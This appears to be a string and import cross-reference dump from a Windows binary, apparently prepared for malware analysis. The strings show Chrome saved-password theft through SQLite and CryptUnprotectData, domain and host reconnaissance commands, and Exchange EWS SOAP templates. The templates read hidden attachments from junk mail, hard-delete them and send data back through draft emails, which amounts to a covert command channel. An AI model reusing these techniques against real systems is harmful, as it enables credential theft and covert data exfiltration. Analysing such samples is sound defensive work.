reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x1400045fa	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x140004607	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x140004614	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x140004621	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x14000462e	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x14000463b	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x140004648	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x140004655	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x140004662	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x14000466f	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x14000467c	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x140004689	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x140004696	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x1400046a3	0x1401a25a8	string	0x140003760	invalid bitset<N> position
0x140004926	0x14018c82c	string	0x140004840	depth
0x140004ea3	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004eb0	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004ebd	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004eca	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004ed7	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004ee4	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004ef1	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004efe	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004f0b	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004f18	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004f25	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004f32	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004f3f	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004f4c	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004f59	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140004f66	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x14000545d	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x14000546a	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140005477	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140005484	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140005491	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x14000549e	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x1400054ab	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x1400054b8	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x1400054c5	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x1400054d2	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x1400054df	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x1400054ec	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x1400054f9	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140005506	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140005513	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x140005520	0x1401a25a8	string	0x140004840	invalid bitset<N> position
0x1400059bb	0x1400078f0	string	0x1400058e0	@SVWH
0x14000783f	0x1401a25c8	string	0x140007670	string too long
0x14000784c	0x1401a25c8	string	0x140007670	string too long
0x140007af3	0x1400078f0	string	0x140007ab0	@SVWH
0x140007b09	0x140008a00	string	0x140007ab0	@UVWH
0x140007c7b	0x140008520	string	0x140007c10	@UVWH
0x140007ef5	0x140008520	string	0x140007e60	@UVWH
0x1400085a4	0x1400085b9	string	0x140008520	3ۀy$ blocks=Basic Latin,Arabic
0x14000860e	0x14018c748	string	0x140008520	bad cast
0x140008a84	0x140008a99	string	0x140008a00	3ۀy$ blocks=Basic Latin,Arabic
0x140008aee	0x14018c748	string	0x140008a00	bad cast
0x140008e55	0x1400078f0	string	0x140008d70	@SVWH
0x140008f8b	0x1400078f0	string	0x140008eb0	@SVWH
0x1400095c0	0x14018c838	string	0x1400094b0	SELECT action_url, username_value, password_value FROM logins
0x1400095e0	0x14018c878	string	0x1400094b0	statement failed rc =
0x1400096bf	0x14018c890	string	0x1400094b0	statement prepared
0x1400096df	0x14018c8a4	string	0x1400094b0	RC:
0x1400097b7	0x14016f020	import	0x1400094b0	CRYPT32.dll.CryptUnprotectData
0x14000991e	0x14018ca28	string	0x140009910	passwordsDB
0x14000993d	0x14018c920	string	0x140009910	Error opening SQLite3 database:
0x140009984	0x14018ca28	string	0x140009910	passwordsDB
0x14000999a	0x14018c948	string	0x140009910	DB Opened.
0x1400099f8	0x14018c958	string	0x1400099c0	LOCALAPPDATA
0x140009a5f	0x14018c968	string	0x1400099c0	\Google\Chrome\User Data\Default\
0x140009a78	0x14018ca18	string	0x1400099c0	Login Data
0x140009ad1	0x14018ca08	string	0x1400099c0	passwordsDB
0x140009cd5	0x14018c9c0	string	0x140009c80	LOCALAPPDATA
0x140009d36	0x14018c9d0	string	0x140009c80	\Google\Chrome\User Data\Default\
0x140009d4f	0x14018c9f8	string	0x140009c80	Login Data
0x140009dac	0x1400094b0	string	0x140009c80	@UVWAVAWH
0x140009df2	0x14018ca38	string	0x140009c80	passwordsDB
0x14000ab20	0x14000db50	string	0x14000aa80	@UVWH
0x14000c358	0x140008520	string	0x14000c2b0	@UVWH
0x14000c3d8	0x14000dca0	string	0x14000c2b0	@UVWH
0x14000c54e	0x1401a25c8	string	0x14000c2b0	string too long
0x14000c55b	0x1401a25c8	string	0x14000c2b0	string too long
0x14000c568	0x1401a25d8	string	0x14000c2b0	invalid string position
0x14000cae3	0x140008520	string	0x14000c9f0	@UVWH
0x14000cb64	0x14000dca0	string	0x14000c9f0	@UVWH
0x14000ccf2	0x1401a25c8	string	0x14000c9f0	string too long
0x14000ccff	0x1401a25c8	string	0x14000c9f0	string too long
0x14000cd0c	0x1401a25d8	string	0x14000c9f0	invalid string position
0x14000daef	0x140008520	string	0x14000dac0	@UVWH
0x14000dbd4	0x14000dbe9	string	0x14000db50	3ۀy$ blocks=Basic Latin,Arabic
0x14000dc3e	0x14018c748	string	0x14000db50	bad cast
0x14000dd24	0x14000dd39	string	0x14000dca0	3ۀy$ blocks=Basic Latin,Arabic
0x14000dd8e	0x14018c748	string	0x14000dca0	bad cast
0x14000e1b2	0x1401a2638	string	0x14000e110	false
0x14000e1c9	0x1401a2640	string	0x14000e110	true
0x14000ebc4	0x14016f288	import	0x14000ebc0	KERNEL32.dll.GetLastError
0x14000ebe0	0x14016f378	import	0x14000ebe0	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x14000ec08	0x14016f240	import	0x14000ebf0	KERNEL32.dll.LoadResource
0x14000ec2b	0x14016f278	import	0x14000ebf0	KERNEL32.dll.LockResource
0x14000ec3f	0x14016f390	import	0x14000ebf0	KERNEL32.dll.SizeofResource
0x14000ece1	0x14016f248	import	0x14000ec90	KERNEL32.dll.FindResourceExW
0x14000ed15	0x14000ecd0	string	0x14000ec90	E3ɍN blocks=Basic Latin,Latin Extended-B
0x14000ed49	0x14016f230	import	0x14000ec90	KERNEL32.dll.HeapAlloc
0x14000ed5e	0x14016f380	import	0x14000ec90	KERNEL32.dll.HeapFree
0x14000ee4f	0x14016f210	import	0x14000ee10	KERNEL32.dll.GetProcessHeap
0x14000f159	0x140038ae0	string	0x14000f0e0	@UVWATAUAVAWH
0x14000f4fd	0x14018e798	string	0x14000f3b0	http://google.com
0x14000f522	0x1400334e0	string	0x14000f3b0	@UVWATAUAVAWH
0x14000f5ce	0x14018e99c	string	0x14000f3b0	https
0x14000f5dd	0x140020850	string	0x14000f3b0	@UAVAWH
0x14000f634	0x14018e9a8	string	0x14000f3b0	google.com
0x14000f676	0x140033330	string	0x14000f3b0	@UVWH
0x14000f823	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x14000f920	0x14018e9b8	string	0x14000f3b0	Caption
0x14000fb3f	0x14018e9c0	string	0x14000f3b0	wmic os get Caption
0x14000fb64	0x140038580	string	0x14000f3b0	@UVWH
0x14000fb85	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x14000fba6	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x14000fbc7	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x14000fbe8	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x14000fd8f	0x14016f370	import	0x14000f3b0	KERNEL32.dll.GetComputerNameExW
0x14000feb4	0x14018e9d8	string	0x14000f3b0	Exchange Servers
0x14000ff10	0x14016f638	import	0x14000f3b0	NETAPI32.dll.NetGroupGetUsers
0x140010156	0x140010170	string	0x14000f3b0	HǄ$H\t blocks=Basic Latin,Latin Extended-B
0x1400102a2	0x1400321a0	string	0x14000f3b0	@UVWATAUAVAWH
0x1400102b3	0x14018ea20	string	0x14000f3b0	USERNAME
0x14001049a	0x1400104b4	string	0x14000f3b0	HǄ$( blocks=Basic Latin,Latin Extended-B
0x14001058a	0x14018ea38	string	0x14000f3b0	Domain Admins
0x1400105ce	0x14016f638	import	0x14000f3b0	NETAPI32.dll.NetGroupGetUsers
0x140010712	0x14001072c	string	0x14000f3b0	HǄ$h blocks=Basic Latin,Latin Extended-B
0x1400107fe	0x14018ea48	string	0x14000f3b0	Domain Controllers
0x140010842	0x14016f638	import	0x14000f3b0	NETAPI32.dll.NetGroupGetUsers
0x140010b18	0x14016f2c0	import	0x14000f3b0	KERNEL32.dll.CreateToolhelp32Snapshot
0x140010b2c	0x14016f270	import	0x14000f3b0	KERNEL32.dll.Process32FirstW
0x140010b4b	0x14016f280	import	0x14000f3b0	KERNEL32.dll.Process32NextW
0x140010c36	0x140020850	string	0x14000f3b0	@UAVAWH
0x140010c45	0x14018ea60	string	0x14000f3b0	svchost.exe
0x140010c61	0x14018d9dc	string	0x14000f3b0	System
0x140010c7d	0x14018ea70	string	0x14000f3b0	csrss.exe
0x140010c99	0x14018ea80	string	0x14000f3b0	lsass.exe
0x140010cb5	0x14018ea90	string	0x14000f3b0	smss.exe
0x140010cd1	0x14018eaa8	string	0x14000f3b0	wininit.exe
0x140010ced	0x14018eab8	string	0x14000f3b0	winlogon.exe
0x140010d09	0x14018eac8	string	0x14000f3b0	conhost.exe
0x140010d25	0x14018ead8	string	0x14000f3b0	dwm.exe
0x140010d41	0x14018eae0	string	0x14000f3b0	explorer.exe
0x140010d5d	0x14018eaf0	string	0x14000f3b0	WmiPrvSE.exe
0x140010d75	0x14018eb00	string	0x14000f3b0	LogonUI.exe
0x140010d8d	0x14018eb10	string	0x14000f3b0	dllhost.exe
0x140010e41	0x14016f260	import	0x14000f3b0	KERNEL32.dll.CloseHandle
0x1400110ac	0x14018eb20	string	0x14000f3b0	ping -n 1 4.2.2.4
0x1400110d1	0x140038580	string	0x14000f3b0	@UVWH
0x1400110f2	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x140011113	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x140011134	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x140011155	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x140011326	0x14018eb38	string	0x14000f3b0	ipconfig
0x14001134b	0x140038580	string	0x14000f3b0	@UVWH
0x14001136c	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x14001138d	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x1400113ae	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x1400113cf	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x1400115a0	0x14018eb50	string	0x14000f3b0	hostname
0x1400115c5	0x140038580	string	0x14000f3b0	@UVWH
0x1400115e6	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x140011607	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x140011628	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x140011649	0x140039e60	string	0x14000f3b0	@SUVWAVAWH
0x140015221	0x14018f240	string	0x140015160	<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><soap:Body><FindItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" Traversal="Shallow"><ItemShape><t:BaseShape>IdOnly</t:BaseShape></ItemShape><Restriction><t:And><t:Contains ContainmentMode="Substring" ><t:FieldURI FieldURI="message:Sender"/><t:Constant Value="%s"/></t:Contains><t:IsEqualTo><t:FieldURI FieldURI="message:IsRead" /><t:FieldURIOrConstant><t:Constant Value="false" /></t:FieldURIOrConstant></t:IsEqualTo><t:IsEqualTo><t:FieldURI FieldURI="item:HasAttachments" /><t:FieldURIOrConstant><t:Constant Value="true" /></t:FieldURIOrConstant></t:IsEqualTo></t:And></Restriction><ParentFolderIds><t:DistinguishedFolderId Id="junkemail"/></ParentFolderIds></FindItem></soap:Body></soap:Envelope>
0x140015275	0x140020850	string	0x140015160	@UAVAWH
0x140015349	0x14018f610	string	0x140015160	/ews/Exchange.asmx
0x14001535b	0x140031d80	string	0x140015160	@UVWATAUAVAWH
0x140015448	0x14018f638	string	0x140015160	Id="(.*?)"
0x140015556	0x140020850	string	0x140015160	@UAVAWH
0x1400155b9	0x140020850	string	0x140015160	@UAVAWH
0x14001561c	0x140020850	string	0x140015160	@UAVAWH
0x140015667	0x14018f648	string	0x140015160	ChangeKey="(.*?)"
0x14001575c	0x14018f660	string	0x140015160	ChangeKey=
0x14001576b	0x140020850	string	0x140015160	@UAVAWH
0x1400157ce	0x140020850	string	0x140015160	@UAVAWH
0x140015831	0x140020850	string	0x140015160	@UAVAWH
0x1400158e6	0x14018f670	string	0x140015160	<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><soap:Body><GetItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><ItemShape><t:BaseShape>Default</t:BaseShape><t:IncludeMimeContent>true</t:IncludeMimeContent></ItemShape><ItemIds><t:ItemId Id="%s" ChangeKey="%s"/></ItemIds></GetItem></soap:Body></soap:Envelope>
0x14001592d	0x140020850	string	0x140015160	@UAVAWH
0x1400159bd	0x140020850	string	0x140015160	@UAVAWH
0x140015a7e	0x14018f8e8	string	0x140015160	/ews/Exchange.asmx
0x140015a90	0x140031d80	string	0x140015160	@UVWATAUAVAWH
0x140015a96	0x14018f910	string	0x140015160	AttachmentId Id="(.*?)"
0x140015c38	0x14018f928	string	0x140015160	AttachmentId Id=
0x140015c47	0x140020850	string	0x140015160	@UAVAWH
0x140015caa	0x140020850	string	0x140015160	@UAVAWH
0x140015d0d	0x140020850	string	0x140015160	@UAVAWH
0x140015da6	0x14018f940	string	0x140015160	<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><soap:Body><GetAttachment xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><AttachmentShape/><AttachmentIds><t:AttachmentId Id="%s"/></AttachmentIds></GetAttachment></soap:Body></soap:Envelope>
0x140015ded	0x140020850	string	0x140015160	@UAVAWH
0x140015e96	0x14018fb70	string	0x140015160	/ews/Exchange.asmx
0x140015ea8	0x140031d80	string	0x140015160	@UVWATAUAVAWH
0x140015ecc	0x14018fb98	string	0x140015160	<t:Content>(.*)</t:Content>
0x1400160d8	0x14018fbb4	string	0x140015160	Temp
0x14001614d	0x14018fbc4	string	0x140015160	\bmp
0x14001617e	0x14018fbbc	string	0x140015160	.bmp
0x140016379	0x14018fbd0	string	0x140015160	<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><soap:Body><DeleteItem DeleteType="HardDelete" xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"><ItemIds><t:ItemId Id="%s" ChangeKey="%s"/></ItemIds></DeleteItem></soap:Body></soap:Envelope>
0x1400163c0	0x140020850	string	0x140015160	@UAVAWH
0x140016450	0x140020850	string	0x140015160	@UAVAWH
0x140016523	0x140031d80	string	0x140015160	@UVWATAUAVAWH
0x140016739	0x14018fd80	string	0x140016660	C:\ProgramData\Microsoft\User Account Pictures\guest.bmp
0x14001678d	0x14018eb44	string	0x140016660	width
0x1400167f8	0x14018daec	string	0x140016660	height
0x1400168ac	0x14018fdbc	string	0x140016660	Temp
0x14001691f	0x14018fdcc	string	0x140016660	\tmp
0x140016950	0x14018fdc4	string	0x140016660	.bmp
0x140016aee	0x14018fe00	string	0x140016660	<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><CreateItem MessageDisposition="SaveOnly" xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"><SavedItemFolderId><t:DistinguishedFolderId Id="drafts" /></SavedItemFolderId><Items><t:Message><t:Subject>%s</t:Subject><t:Body BodyType="Text">%s</t:Body><t:ToRecipients><t:Mailbox><t:EmailAddress>%s</t:EmailAddress></t:Mailbox></t:ToRecipients></t:Message></Items></CreateItem></soap:Body></soap:Envelope>
0x140016b30	0x140020850	string	0x140016660	@UAVAWH
0x140016b57	0x140020c20	string	0x140016660	@SUVAVH
0x140016bbb	0x140020850	string	0x140016660	@UAVAWH
0x140016be2	0x140020c20	string	0x140016660	@SUVAVH
0x140016c45	0x140020850	string	0x140016660	@UAVAWH
0x140016d0b	0x14018fdd8	string	0x140016660	/ews/Exchange.asmx
0x140016d1f	0x140031d80	string	0x140016660	@UVWATAUAVAWH
0x140016e30	0x140190098	string	0x140016660	Id="(.*)"\sChangeKey="(.*)"
0x140016fde	0x1401900b4	string	0x140016660	.bmp
0x14001701f	0x1401900bc	string	0x140016660	Temp
0x140017093	0x1401900cc	string	0x140016660	\tmp
0x1400170c4	0x1401900c4	string	0x140016660	.bmp
0x140017248	0x140190100	string	0x140016660	<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><soap:Body><CreateAttachment xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><ParentItemId Id="%s" ChangeKey="%s" /><Attachments><t:FileAttachment><t:Name>%s</t:Name><t:Content>%s</t:Content></t:FileAttachment></Attachments></CreateAttachment></soap:Body></soap:Envelope>
0x14001728f	0x140020850	string	0x140016660	@UAVAWH
0x14001731f	0x140020850	string	0x140016660	@UAVAWH
0x1400173af	0x140020850	string	0x140016660	@UAVAWH
0x14001743f	0x140020850	string	0x140016660	@UAVAWH
0x140017500	0x1401900d8	string	0x140016660	/ews/Exchange.asmx
0x140017517	0x140031d80	string	0x140016660	@UVWATAUAVAWH
0x140017536	0x140190380	string	0x140016660	RootItemId="(.*)"\sRootItemChangeKey="(.*)"
0x140017715	0x140016f90	string	0x140016660	D;|$0
0x140017784	0x1401903b0	string	0x140016660	<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><soap:Body><SendItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" SaveItemToFolder="false"><ItemIds><t:ItemId Id="%s" ChangeKey="%s"/></ItemIds></SendItem></soap:Body></soap:Envelope>
0x1400177cb	0x140020850	string	0x140016660	@UAVAWH
0x14001785b	0x140020850	string	0x140016660	@UAVAWH
0x14001792e	0x140031d80	string	0x140016660	@UVWATAUAVAWH
0x140018ad5	0x14016f290	import	0x1400189d0	KERNEL32.dll.Sleep
0x140019099	0x14002dfe0	string	0x1400189d0	@UVWATAUAVAWH
0x1400190e1	0x1400398c0	string	0x1400189d0	@UVWH
0x140019202	0x140030db0	string	0x1400189d0	@USVWATAUAVAWH
0x14001931a	0x14016f290	import	0x1400189d0	KERNEL32.dll.Sleep
0x140019791	0x14018eb5c	string	0x1400189d0	<EOF>
0x140019ceb	0x14002dfe0	string	0x1400189d0	@UVWATAUAVAWH
0x140019d2d	0x1400398c0	string	0x1400189d0	@UVWH
0x140019e15	0x140030db0	string	0x1400189d0	@USVWATAUAVAWH
0x14001a0f2	0x140190608	string	0x14001a080	Temp
0x14001a14f	0x140190610	string	0x14001a080	\tmp
0x14001a67a	0x14002dfe0	string	0x14001a080	@UVWATAUAVAWH
0x14001a68a	0x1400398c0	string	0x14001a080	@UVWH
0x14001a7c5	0x140030db0	string	0x14001a080	@USVWATAUAVAWH
0x14001a8dd	0x14016f290	import	0x14001a080	KERNEL32.dll.Sleep
0x14001ad2b	0x14002e790	string	0x14001a080	@UVWATAUAVAWH
0x14001b195	0x14002dfe0	string	0x14001a080	@UVWATAUAVAWH
0x14001b1d9	0x1400398c0	string	0x14001a080	@UVWH
0x14001b2aa	0x140030db0	string	0x14001a080	@USVWATAUAVAWH
0x14001fb70	0x14016f298	import	0x14001fb30	KERNEL32.dll.MultiByteToWideChar
0x14001fbb5	0x14016f298	import	0x14001fb30	KERNEL32.dll.MultiByteToWideChar
0x14001fd86	0x14001fd70	string	0x14001fd50	D9@ }
0x140020063	0x140022a80	string	0x140020020	@UVWH
0x14002006f	0x140008520	string	0x140020020	@UVWH
0x14002020b	0x140020850	string	0x140020200	@UAVAWH
0x140020221	0x140020850	string	0x140020200	@UAVAWH
0x140020417	0x14016f208	import	0x140020390	KERNEL32.dll.WideCharToMultiByte
0x140020429	0x14016f288	import	0x140020390	KERNEL32.dll.GetLastError
0x140020452	0x14016f208	import	0x140020390	KERNEL32.dll.WideCharToMultiByte
0x140020488	0x14016f208	import	0x140020390	KERNEL32.dll.WideCharToMultiByte
0x140020a61	0x140020c20	string	0x1400209f0	@SUVAVH
0x14002192d	0x14016f238	import	0x140021900	KERNEL32.dll.FindResourceW
0x140022b04	0x140022b19	string	0x140022a80	3ۀy$ blocks=Basic Latin,Arabic
0x140022b6e	0x14018c748	string	0x140022a80	bad cast
0x140022d4c	0x14000e350	string	0x140022ce0	@UVWH
0x140022ec3	0x1401a25c8	string	0x140022e10	string too long
0x140023540	0x1401a25d8	string	0x1400233b0	invalid string position
0x14002354d	0x1401a25d8	string	0x1400233b0	invalid string position
0x14002355a	0x1401a25c8	string	0x1400233b0	string too long
0x140023567	0x1401a25c8	string	0x1400233b0	string too long
0x14002443b	0x1401a27e8	string	0x1400243c0	vector<T> too long
0x14002471d	0x1401a27e8	string	0x1400246d0	vector<T> too long
0x1400248cd	0x1401a2a50	string	0x1400248a0	()$^.*+?[]|\-{},:=!\n\r\b
0x140024b3f	0x140026a70	string	0x140024af0	@VWAVH
0x140025085	0x1400250ac	string	0x140024de0	3ɋE\f blocks=Basic Latin,Latin Extended-B
0x1400250a3	0x1400250ac	string	0x140024de0	3ɋE\f blocks=Basic Latin,Latin Extended-B
0x14002523e	0x140026cc0	string	0x1400251b0	@UVWH
0x14002541b	0x1401a27e8	string	0x1400253a0	vector<T> too long
0x1400263c1	0x1401a27e8	string	0x140026330	vector<T> too long
0x140026434	0x1401a27e8	string	0x140026330	vector<T> too long
0x140026e13	0x1401a2820	string	0x140026cc0	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_
0x140026e38	0x1401a2820	string	0x140026cc0	abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_
0x140026ef5	0x140028920	string	0x140026cc0	@SAWH
0x140026f4a	0x140026cc0	string	0x140026cc0	@UVWH
0x14002764c	0x140027693	string	0x140027570	E9H
0x140027c30	0x1401a27e8	string	0x140027bd0	vector<T> too long
0x140028260	0x140029c30	string	0x140028110	@WATAUAVAWH
0x140028460	0x140026cc0	string	0x1400283c0	@UVWH
0x140028500	0x140026cc0	string	0x1400283c0	@UVWH
0x140028708	0x140028730	string	0x140028650	D;{ }
0x14002870d	0x140028730	string	0x140028650	D;{ }
0x14002871a	0x140026cc0	string	0x140028650	@UVWH
0x140028763	0x140026cc0	string	0x140028650	@UVWH
0x1400287c1	0x140026cc0	string	0x140028650	@UVWH
0x1400287e6	0x140026cc0	string	0x140028650	@UVWH
0x140028847	0x140026cc0	string	0x140028650	@UVWH
0x140028e67	0x1401a2860	string	0x140028e20	map/set<T> too long
0x1400293ca	0x1401a27e8	string	0x140029370	vector<T> too long
0x14002954a	0x14002afd0	string	0x1400294d0	ATAVAWH
0x140029924	0x1400299bf	string	0x140029850	<xu&
0x14002992e	0x1400299bf	string	0x140029850	<xu&
